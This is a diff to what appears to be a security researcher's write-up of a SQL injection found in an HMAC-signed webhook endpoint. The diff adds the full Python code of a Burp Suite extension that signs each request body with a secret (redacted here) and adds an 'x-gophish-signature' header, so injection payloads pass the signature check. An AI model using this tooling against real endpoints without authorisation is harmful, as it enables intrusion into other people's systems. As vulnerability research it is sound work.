@@ -72,7 +72,36 @@ I got a MySQL error, confirming the endpoint is vulnerable!
 Manual testing was too slow, so I wrote a Burp extension that automatically adds the HMAC header:
 
 ```python
-# (Burp extension code here — kept unchanged for clarity)
+from burp import IBurpExtender, ISessionHandlingAction
+from java.io import PrintWriter
+from datetime import datetime
+import hashlib, hmac
+
+class BurpExtender(IBurpExtender, ISessionHandlingAction):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("HMAC Header")
+        PrintWriter(callbacks.getStdout(), True).println("HMAC Header OK")
+        callbacks.registerSessionHandlingAction(self)
+        PrintWriter(callbacks.getStdout(), True).println("Session started")
+        return
+
+    def getActionName(self):
+        return "HMAC Header"
+
+    def performAction(self, currentRequest, macroItems):
+        Secret = "3CWV<redacted>"
+        stdout = PrintWriter(self._callbacks.getStdout(), True)
+        requestInfo = self._helpers.analyzeRequest(currentRequest)
+        BodyBytes = currentRequest.getRequest()[requestInfo.getBodyOffset():]
+        BodyStr = self._helpers.bytesToString(BodyBytes)
+        _hmac = hmac.new(Secret, BodyStr, digestmod=hashlib.sha256).hexdigest()
+        headers = requestInfo.getHeaders()
+        headers.add("x-gophish-signature: sha256=" + _hmac)
+        message = self._helpers.buildHttpMessage(headers, BodyStr)
+        currentRequest.setRequest(message)
+        return
 ```
 
 Installed via Burp's Custom Extensions feature:  
